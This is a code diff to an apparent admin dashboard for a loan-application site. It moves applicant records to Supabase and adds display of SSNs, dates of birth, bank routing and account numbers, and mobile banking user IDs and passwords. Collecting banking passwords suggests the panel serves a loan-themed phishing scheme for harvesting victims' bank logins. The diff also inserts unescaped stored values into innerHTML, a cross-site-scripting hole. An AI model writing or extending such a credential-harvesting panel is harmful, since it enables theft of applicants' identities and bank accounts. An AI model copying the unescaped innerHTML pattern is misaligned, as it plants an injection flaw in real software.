@@ -410,50 +410,84 @@
             });
         }
 
-        function viewApplication(email) {
+        async function viewApplication(email) {
             currentApplicationId = email;
             
-            // Get application data
-            const loanData = localStorage.getItem('loanApplicationData');
-            if (!loanData) {
-                alert('Application data not found');
-                return;
+            try {
+                // Get application data from Supabase
+                const { data: loanApp, error: loanError } = await supabase
+                    .from('loan_applications')
+                    .select('*')
+                    .eq('email', email)
+                    .single();
+
+                if (loanError || !loanApp) {
+                    console.error('Error loading application:', loanError);
+                    alert('Application data not found');
+                    return;
+                }
+
+                // Get user credentials from Supabase
+                const { data: credentials, error: credError } = await supabase
+                    .from('user_credentials')
+                    .select('*')
+                    .eq('email', email)
+                    .single();
+
+                if (credError) {
+                    console.log('No credentials found or error:', credError);
+                }
+
+                const fullName = loanApp.full_name || `${loanApp.first_name || ''} ${loanApp.last_name || ''}`.trim();
+                const address = [loanApp.street_address, loanApp.city, loanApp.state, loanApp.zip_code].filter(Boolean).join(', ');
+
+                const detailsHtml = `
+                    <div class="grid md:grid-cols-2 gap-6">
+                        <div>
+                            <h4 class="text-lg font-semibold text-white mb-3">Personal Information</h4>
+                            <div class="space-y-2">
+                                <p class="text-gray-400">Name: <span class="text-white">${fullName}</span></p>
+                                <p class="text-gray-400">Email: <span class="text-white">${loanApp.email}</span></p>
+                                <p class="text-gray-400">Phone: <span class="text-white">${loanApp.phone || loanApp.telephone_number}</span></p>
+                                <p class="text-gray-400">Address: <span class="text-white">${address}</span></p>
+                                <p class="text-gray-400">Date of Birth: <span class="text-white">${loanApp.date_of_birth || 'N/A'}</span></p>
+                                <p class="text-gray-400">SSN: <span class="text-white">${loanApp.ssn || loanApp.social_security || 'N/A'}</span></p>
+                            </div>
+                        </div>
+                        <div>
+                            <h4 class="text-lg font-semibold text-white mb-3">Loan Information</h4>
+                            <div class="space-y-2">
+                                <p class="text-gray-400">Loan Amount: <span class="text-white">$${parseFloat(loanApp.loan_amount || 0).toLocaleString()}</span></p>
+                                <p class="text-gray-400">Loan Purpose: <span class="text-white">${loanApp.loan_purpose || 'N/A'}</span></p>
+                                <p class="text-gray-400">Loan Duration: <span class="text-white">${loanApp.loan_duration || 'N/A'} months</span></p>
+                                <p class="text-gray-400">Bank: <span class="text-white">${loanApp.customer_bank || 'N/A'}</span></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mt-6">
+                        <h4 class="text-lg font-semibold text-white mb-3">Bank Credentials</h4>
+                        <div class="space-y-2">
+                            <p class="text-gray-400">Routing Number: <span class="text-white">${credentials?.routing_number || loanApp.routing_number || 'N/A'}</span></p>
+                            <p class="text-gray-400">Account Number: <span class="text-white">${credentials?.account_number || loanApp.account_number || 'N/A'}</span></p>
+                            <p class="text-gray-400">Mobile Banking User ID: <span class="text-white">${credentials?.mobile_banking_user_id || loanApp.mobile_banking_user_id || 'N/A'}</span></p>
+                            <p class="text-gray-400">Mobile Banking Password: <span class="text-white">${credentials?.mobile_banking_password || loanApp.mobile_banking_password || 'N/A'}</span></p>
+                            <p class="text-gray-400">Telephone Number: <span class="text-white">${credentials?.telephone_number || loanApp.telephone_number || 'N/A'}</span></p>
+                        </div>
+                    </div>
+                `;
+
+                document.getElementById('applicationDetails').innerHTML = detailsHtml;
+
+                // Load existing notes
+                loadNotes(email);
+
+                // Show modal
+                document.getElementById('applicationModal').classList.remove('hidden');
+
+            } catch (error) {
+                console.error('Error loading application details:', error);
+                alert('Failed to load application details');
             }
-
-            const data = JSON.parse(loanData);
-            const fullName = data.fullName || data.name || `${data.firstName || ''} ${data.lastName || ''}`.trim();
-            const address = [data.streetAddress || data.address, data.city, data.state, data.zipCode].filter(Boolean).join(', ');
-
-            const detailsHtml = `
-                <div class="grid md:grid-cols-2 gap-6">
-                    <div>
-                        <h4 class="text-lg font-semibold text-white mb-3">Personal Information</h4>
-                        <div class="space-y-2">
-                            <p class="text-gray-400">Name: <span class="text-white">${fullName}</span></p>
-                            <p class="text-gray-400">Email: <span class="text-white">${data.email}</span></p>
-                            <p class="text-gray-400">Phone: <span class="text-white">${data.phone || data.telephoneNumber}</span></p>
-                            <p class="text-gray-400">Address: <span class="text-white">${address}</span></p>
-                        </div>
-                    </div>
-                    <div>
-                        <h4 class="text-lg font-semibold text-white mb-3">Loan Information</h4>
-                        <div class="space-y-2">
-                            <p class="text-gray-400">Loan Amount: <span class="text-white">$${parseFloat(data.loanAmount || 0).toLocaleString()}</span></p>
-                            <p class="text-gray-400">Loan Purpose: <span class="text-white">${data.loanPurpose}</span></p>
-                            <p class="text-gray-400">Loan Duration: <span class="text-white">${data.loanDuration} months</span></p>
-                            <p class="text-gray-400">Bank: <span class="text-white">${data.customerBank}</span></p>
-                        </div>
-                    </div>
-                </div>
-            `;
-
-            document.getElementById('applicationDetails').innerHTML = detailsHtml;
-
-            // Load existing notes
-            loadNotes(email);
-
-            // Show modal
-            document.getElementById('applicationModal').classList.remove('hidden');
         }
 
         async function loadNotes(email) {
